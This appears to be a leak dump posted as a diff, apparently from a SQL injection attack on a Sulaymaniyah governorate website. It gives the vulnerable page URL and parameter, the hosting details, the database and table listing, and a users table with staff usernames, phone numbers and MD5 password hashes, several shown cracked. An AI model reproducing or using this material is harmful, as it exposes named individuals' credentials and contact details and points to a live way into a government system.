@@ -1,0 +1,72 @@
+.gov government 
+
+.krd Imaginary Kurdistan	
+ 
+Slemani Governorate. 
+
+Sulaymaniyah Province
+
+Padan Information Center
+
+Host name: dotvisionit.com
+ISP: Steadfast
+Organization: LiquidNet US LLC
+
+http://slemani.gov.krd/so/pageDetail.php?secID=2
+
+available databases [2]:                                                                                                                                             
+[*] information_schema
+[*] wwwslema_sulgovdb
+
+Database: wwwslema_sulgovdb                                                                                                                                          
+[30 tables]
++---------------------+
+| Sheet1              |
+| albums              |
+| alert               |
+| alert_status        |
+| arabic_news         |
+| business_types      |
+| employees           |
+| item_date           |
+| item_type           |
+| item_value          |
+| languages           |
+| news_type           |
+| news_type_detail    |
+| photos_gallery      |
+| public_phones       |
+| role_permissions    |
+| sawza_mewa          |
+| sawza_mewa_date     |
+| sawza_mewa_value    |
+| section_type        |
+| section_type_detail |
+| sub_data_img        |
+| sub_section_ar_data |
+| sub_section_data    |
+| sub_section_en_data |
+| sub_section_type    |
+| tandren             |
+| testtable           |
+| user_roles          |
+| users               |
++---------------------+
+
+Database: wwwslema_sulgovdb                                                                                                                                          
+Table: users
+[13 entries]
++--------------+-----------------+------------------------------------------+
+| phone_number | user_name       | password                                 |
++--------------+-----------------+------------------------------------------+
+| <blank>      | hemin           | 55e89a7e6a0698c5e4af7636d4982a8e (hemin) |
+| 07501145192  | kosallan.husan  | ??                                       |
+| 07701437648  | shna.qader      | 55e89a7e6a0698c5e4af7636d4982a8e (hemin) |
+| 07703535819  | kazhaw.fatah    | 55e89a7e6a0698c5e4af7636d4982a8e (hemin) |
+| 07701945475  | raman.karim     | 55e89a7e6a0698c5e4af7636d4982a8e (hemin) |
+| 07702190024  | shko.qader      | 55e89a7e6a0698c5e4af7636d4982a8e (hemin) |
+| <blank>      | daryan.amer     | a3e17f3b36eed680b815f02976aee758         |
+| 07703613438  | ranjdar.bahadin | 875617a3a74e82e30ce8246e6617f95b         |
+| 07701209999  | salih.rahman    | cc65c0095b54a16a021de2fb36e56153         |
+| 07701940414  | amr.adl         | ??                                       |
++--------------+-----------------+------------------------------------------+
